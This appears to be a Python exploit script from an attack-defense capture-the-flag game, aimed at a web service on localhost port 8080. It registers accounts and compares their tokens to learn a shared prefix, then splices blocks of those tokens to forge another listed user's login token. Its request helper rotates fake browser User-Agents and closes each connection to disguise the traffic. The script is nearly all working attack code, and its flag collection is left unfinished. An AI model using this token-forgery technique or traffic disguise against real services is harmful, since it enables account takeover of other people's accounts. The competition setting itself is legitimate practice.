import base64
import os
import random
import string

import gmpy2
import libnum
import requests

""" <config> """
PORT = 8080
# DEBUG -- logs to stderr, TRACE -- log HTTP requests
DEBUG = os.getenv("DEBUG", True)
TRACE = os.getenv("TRACE", False)
""" </config> """


class FakeSession(requests.Session):
    """
    FakeSession reference:
        - `s = FakeSession(host, PORT)` -- creation
        - `s` mimics all standard request.Session API except of fe features:
            -- `url` can be started from "/path" and will be expanded to "http://{host}:{PORT}/path"
            -- for non-HTTP scheme use "https://{host}/path" template which will be expanded in the same manner
            -- `s` uses random browser-like User-Agents for every requests
            -- `s` closes connection after every request, so exploit get splitted among multiple TCP sessions
    Short requests reference:
        - `s.post(url, data={"arg": "value"})`          -- send request argument
        - `s.post(url, headers={"X-Boroda": "DA!"})`    -- send additional headers
        - `s.post(url, auth=(login, password)`          -- send basic http auth
        - `s.post(url, timeout=1.1)`                    -- send timeouted request
        - `s.request("CAT", url, data={"eat":"mice"})`  -- send custom-verb request
        (response data)
        - `r.text`/`r.json()`  -- text data // parsed json object
    """

    USER_AGENTS = [
        """Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/11.1 Safari/605.1.15""",
        """Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36""",
        """Mozilla/5.0 (Windows; U; Windows NT 6.1; rv:2.2) Gecko/20110201""",
        """Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.6; en-US; rv:1.9.2.13; ) Gecko/20101203""",
        """Mozilla/5.0 (Windows NT 5.1) Gecko/20100101 Firefox/14.0 Opera/12.0""",
    ]

    def __init__(self, host, port):
        super(FakeSession, self).__init__()
        if port:
            self.host_port = "{}:{}".format(host, port)
        else:
            self.host_port = host

    def prepare_request(self, request):
        r = super(FakeSession, self).prepare_request(request)
        r.headers["User-Agent"] = random.choice(FakeSession.USER_AGENTS)
        r.headers["Connection"] = "close"
        return r

    # fmt: off
    def request(self, method, url,
                params=None, data=None, headers=None,
                cookies=None, files=None, auth=None, timeout=None, allow_redirects=True,
                proxies=None, hooks=None, stream=None, verify=None, cert=None, json=None,
                ):
        if url[0] == "/" and url[1] != "/":
            url = "http://" + self.host_port + url
        else:
            url = url.format(host=self.host_port)
        r = super(FakeSession, self).request(
            method, url, params, data, headers, cookies, files, auth, timeout,
            allow_redirects, proxies, hooks, stream, verify, cert, json,
        )
        if TRACE:
            print("[TRACE] {method} {url} {r.status_code}".format(**locals()))
        return r
    # fmt: on


def rand_string(n=12, alphabet=string.ascii_uppercase + string.ascii_lowercase + string.digits):
    return ''.join(random.choice(alphabet) for _ in range(n))


def _register(s, name):
    try:
        r = s.post(
            "/api/v1/auth/register",
            data=dict(
                username=name
            ),
        )
    except Exception as e:
        print(f"Failed to register in service: {e}")

    if r.status_code != 200:
        print(f"Unexpected /auth/register code {r.status_code}")

    try:
        token = r.json()["redirect"][10:]
    except Exception as e:
        print(f"Failed to get token after register in service: {e}")

    return token


def _login(s, token):
    try:
        r = s.post(
            "/api/v1/auth/login",
            data=dict(
                token=token
            ),
        )
    except Exception as e:
        print(f"Failed to login in service: {e}")

    if r.status_code != 200:
        print(f"Unexpected /auth/login code {r.status_code}")


def exploit(host: str):
    s = FakeSession(host, PORT)

    # find len padding
    name = rand_string()
    token = _register(s, name)
    print(name, base64.b64decode(token), len(base64.b64decode(token)))

    name_pad = "A"*16 + name
    token_pad = _register(s, name_pad)
    print(name_pad, base64.b64decode(token_pad), len(base64.b64decode(token_pad)))

    padding = b""
    for i in range(len(token_pad)):
        if base64.b64decode(token_pad)[i] == base64.b64decode(token)[i]:
            padding += (base64.b64decode(token_pad)[i].to_bytes(1, byteorder='big'))
        else:
            break

    print(padding, len(padding))

    # attack

    r = s.get(
        "/api/v1/users"
    )

    users = r.json()["users"]
    for user in users:
        s = FakeSession(host, PORT)
        name_pad = "A"*16 + user
        token_pad = _register(s, name_pad)

        valid_token = base64.b64decode(token_pad)
        valid_token = padding + valid_token[len(padding) + 16:]

        _login(s, base64.b64encode(valid_token))
        break

    return []


def main():
    flags = exploit("localhost")
    print(flags)


if __name__ == "__main__":
    main()
